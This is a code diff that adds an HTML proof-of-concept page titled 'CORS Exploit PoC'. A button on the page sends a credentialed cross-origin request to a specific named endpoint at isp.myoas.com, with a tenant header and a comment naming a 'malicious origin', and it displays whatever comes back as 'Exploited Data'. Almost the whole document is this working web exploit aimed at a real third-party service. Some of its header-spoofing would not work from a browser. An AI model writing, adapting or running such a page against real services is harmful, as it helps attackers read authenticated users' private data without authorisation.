@@ -1,8 +1,42 @@
-<script>
-  fetch("https://isp.myoas.com//smdm/public/gsrm/v2/lov/region?countryId=25&size=5020", {
-    credentials: "include"
-  })
-  .then(response => response.text())
-  .then(data => console.log("CORS Response:", data))
-  .catch(err => console.error("CORS Error:", err));
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS Exploit</title>
+</head>
+<body>
+  <h1>CORS Exploit PoC</h1>
+  <button id="exploit">Click to Exploit</button>
+  <pre id="result">Response will appear here...</pre>
+
+  <script>
+    document.getElementById("exploit").addEventListener("click", function() {
+      fetch("https://isp.myoas.com/smdm/public/gsrm/v2/lov/region?countryId=25&size=5020", {
+        method: "GET",
+        credentials: "include", // Include cookies to simulate an authenticated user
+        headers: {
+          "Accept": "application/json, text/plain, */*",
+          "Srm-Tenant-Code": "SRM-OPPO",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36",
+          "Referer": "https://isp.myoas.com/home/oppo?page=register",
+          "Origin": "https://revenix-aer.github.io/rev/" // Set the malicious origin
+        }
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Network response was not ok: " + response.statusText);
+        }
+        return response.text();
+      })
+      .then(data => {
+        document.getElementById("result").textContent = "Exploited Data: " + data;
+      })
+      .catch(err => {
+        document.getElementById("result").textContent = "Exploitation Failed: " + err;
+      });
+    });
+  </script>
+</body>
+</html>
